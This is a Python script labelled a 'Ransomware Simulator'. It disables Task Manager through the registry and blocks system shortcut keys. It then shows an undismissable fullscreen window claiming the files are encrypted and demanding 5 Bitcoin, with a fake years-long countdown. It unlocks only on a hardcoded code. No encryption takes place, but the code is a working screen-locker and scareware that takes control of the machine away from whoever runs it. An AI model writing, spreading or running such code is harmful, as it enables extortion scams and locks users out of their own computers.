import tkinter as tk
import threading
import time
import keyboard  # pip install keyboard
import subprocess

UNLOCK_CODE = "hunter2"

def block_keys():
    keys_to_block = [
        'left windows', 'right windows',
        'alt+tab', 'ctrl+esc', 'alt+esc',
        'alt+f4', 'ctrl+shift+esc'
    ]
    try:
        for key in keys_to_block:
            keyboard.block_key(key)
    except:
        pass

def unblock_keys():
    keys_to_unblock = [
        'left windows', 'right windows',
        'alt+tab', 'ctrl+esc', 'alt+esc',
        'alt+f4', 'ctrl+shift+esc'
    ]
    try:
        for key in keys_to_unblock:
            keyboard.unblock_key(key)
    except:
        pass

def disable_task_manager():
    # Disable Task Manager via registry (requires admin)
    # Optional: remove if no admin rights
    try:
        import winreg
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER,
                             r"Software\Microsoft\Windows\CurrentVersion\Policies\System", 0, winreg.KEY_SET_VALUE)
    except FileNotFoundError:
        try:
            key = winreg.CreateKey(winreg.HKEY_CURRENT_USER,
                                  r"Software\Microsoft\Windows\CurrentVersion\Policies\System")
        except Exception:
            return
    except Exception:
        return
    try:
        winreg.SetValueEx(key, "DisableTaskMgr", 0, winreg.REG_DWORD, 1)
        winreg.CloseKey(key)
    except Exception:
        pass

def enable_task_manager():
    try:
        import winreg
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER,
                             r"Software\Microsoft\Windows\CurrentVersion\Policies\System", 0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(key, "DisableTaskMgr", 0, winreg.REG_DWORD, 0)
        winreg.CloseKey(key)
    except Exception:
        pass

def main():
    disable_task_manager()
    block_keys()

    root = tk.Tk()
    root.title("Ransomware Simulator")
    root.attributes("-fullscreen", True)
    root.configure(bg='black')

    root.protocol("WM_DELETE_WINDOW", lambda: None)  # Disable close button
    root.bind("<Escape>", lambda e: "break")         # Disable Escape
    root.bind("<Alt-F4>", lambda e: "break")         # Disable Alt+F4

    label1 = tk.Label(root, text="YOUR FILES HAVE BEEN ENCRYPTED", fg="red", bg="black", font=("Courier", 36, "bold"))
    label1.pack(pady=20)

    label2 = tk.Label(root, text="You have to pay 5 Bitcoin to unlock this computer's files.",
                      fg="lime", bg="black", font=("Courier", 24))
    label2.pack(pady=10)

    timer_label = tk.Label(root, text="", fg="lime", bg="black", font=("Courier", 28))
    timer_label.pack(pady=30)

    prompt = tk.Label(root, text="Enter decryption key:", fg="lime", bg="black", font=("Courier", 18))
    prompt.pack()

    entry = tk.Entry(root, font=("Courier", 18), width=30, show="*")
    entry.pack(pady=10)

    status = tk.Label(root, text="", fg="yellow", bg="black", font=("Courier", 14))
    status.pack()

    def check_key(event=None):
        if entry.get().strip().lower() == UNLOCK_CODE:
            unblock_keys()
            enable_task_manager()
            root.destroy()
        else:
            status.config(text="INVALID DECRYPTION KEY")

    entry.bind("<Return>", check_key)

    def countdown():
        total = 14 * 365 * 24 * 60 * 60
        while total > 0:
            yrs = total // (365 * 24 * 3600)
            rem = total % (365 * 24 * 3600)
            days = rem // (24 * 3600)
            hrs = (rem % (24 * 3600)) // 3600
            mins = (rem % 3600) // 60
            secs = total % 60
            timer_label.config(text=f"Time Remaining: {yrs}y {days}d {hrs:02}:{mins:02}:{secs:02}")
            time.sleep(1)
            total -= 1
        timer_label.config(text="FILES PERMANENTLY LOST")

    threading.Thread(target=countdown, daemon=True).start()

    root.mainloop()

if __name__ == "__main__":
    main()
